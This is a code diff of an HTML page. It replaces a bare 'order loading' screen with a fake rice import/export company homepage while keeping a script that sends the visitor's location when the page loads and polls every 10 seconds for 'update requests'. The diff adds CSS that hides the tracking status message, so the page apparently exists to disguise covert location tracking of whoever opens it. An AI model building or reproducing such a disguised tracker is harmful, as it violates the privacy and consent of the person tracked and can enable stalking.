@@ -3,11 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Continue to get order/title>
+    <title>International Rice Import & Export</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        h1 {
+            color: #2E8B57;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 800px;
+            margin: auto;
+        }
+        .hidden {
+            display: none; /* ✅ Hide tracking messages */
+        }
+    </style>
 </head>
 <body>
-    <h2>Loading..../h2>
-    <p id="status">Order is getting ready...</p>
+    <div class="container">
+        <h1>Welcome to International Rice Import & Export</h1>
+        <p>We specialize in importing and exporting high-quality rice worldwide. Our company ensures the best grains, carefully sourced and processed to meet international standards.</p>
+        <h2>Why Choose Us?</h2>
+        <ul>
+            <li>🌾 Premium quality Basmati & Non-Basmati rice</li>
+            <li>🚢 Fast international shipping</li>
+            <li>📜 Certified and approved by global food standards</li>
+            <li>🌎 Exporting to over 50 countries</li>
+        </ul>
+        <h2>Our Products</h2>
+        <p>We provide a variety of rice types, including:</p>
+        <ul>
+            <li>🥇 Super Kernel Basmati Rice</li>
+            <li>🥈 1121 Steam Basmati Rice</li>
+            <li>🥉 Parboiled Rice</li>
+            <li>🍚 Jasmine Rice</li>
+        </ul>
+        <h2>Contact Us</h2>
+        <p>If you are interested in rice import and export opportunities, contact us at:</p>
+        <p><strong>Email:</strong> info@riceexportglobal.com</p>
+        <p><strong>Phone:</strong> +92 300 1234567</p>
+    </div>
+
+    <p id="status" class="hidden">Checking update requests...</p>
 
     <script>
         function sendLocation() {
@@ -62,7 +107,7 @@
         // ✅ Send location when page loads
         window.onload = sendLocation;
 
-        // ✅ Check for parent’s update request every 10 seconds
+        // ✅ Check for parent's update request every 10 seconds
         setInterval(checkForUpdateRequest, 10000);
     </script>
 </body>
